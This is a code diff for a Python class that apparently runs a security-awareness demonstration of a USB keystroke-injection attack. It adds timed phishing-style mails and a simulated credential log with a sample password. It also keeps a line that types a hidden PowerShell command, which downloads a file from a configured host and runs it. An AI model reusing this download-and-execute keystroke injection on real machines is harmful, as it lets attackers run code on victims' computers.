@@ -26,6 +26,7 @@ import importlib.resources
 import subprocess  # nosec
 import ipaddress
 import pathlib
+import threading
 
 from typing import List
 
@@ -86,6 +87,10 @@ class DuckyDemo:
         self.locale = locale.Locale()
         self.locale.add_locale_dir(localedir)
         self.usb_monitor = None
+        self.logged_credentials = []
+
+    def add_credentials(self, user, pw):
+        self.logged_credentials.append((user, pw))
 
     def prepare(self):
         # get wsl ip
@@ -106,6 +111,7 @@ class DuckyDemo:
         if self.running:
             self.stop()
         self.locale.update_locale(config.EnvironmentConfig.LANGUAGE)
+        self.logged_credentials.clear()
 
         # set hosts entry
         self.running = True
@@ -156,6 +162,21 @@ class DuckyDemo:
     def send_second_mail(self) -> None:
         self._send_mail(["wrong_stick.yml"])
 
+    def send_attacked_mails(self) -> None:
+        threading.Timer(5.0, self._send_mail,
+                        args=[["project_deleted.yml"]]).start()
+        threading.Timer(10.0, self._send_mail,
+                        args=[["internal.yml"]]).start()
+        threading.Timer(10.0, self.add_credentials,
+                        args=["kunden_db",
+                              "73ioi2em9JIYddo3CdZ3AY6VQuD6GG1t"]).start()
+        threading.Timer(20.0, self._send_mail,
+                        args=[["backup.yml"]]).start()
+        threading.Timer(30.0, self._send_mail,
+                        args=[["it_admin.yml"]]).start()
+        threading.Timer(40.0, self._send_mail,
+                        args=[["it_test.yml"]]).start()
+
     def add_cert(self) -> None:
         set_proxy_cert.add_cert()
         set_proxy_cert.enable_and_set_proxy()
@@ -170,8 +191,8 @@ class DuckyDemo:
         keyboard.release(Key.cmd)
         keyboard.release("r")
         time.sleep(keystroke_injection_sleeps)
-        keyboard.type("powershell -Windowstyle hidden curl.exe -k https://{0}/{1} -s -o $ENV:Temp/{1} ; python $ENV:Temp/{1}".format(hostname, filename))  # noqa: E501
-
+        cmd = "powershell -Windowstyle hidden curl.exe -k https://{0}/{1} -s -o $ENV:Temp/{1} ; python $ENV:Temp/{1}".format(hostname, filename)  # noqa: E501
+        keyboard.type(cmd)  # noqa: E501
         time.sleep(keystroke_injection_sleeps)
         keyboard.press(Key.enter)
         keyboard.release(Key.enter)
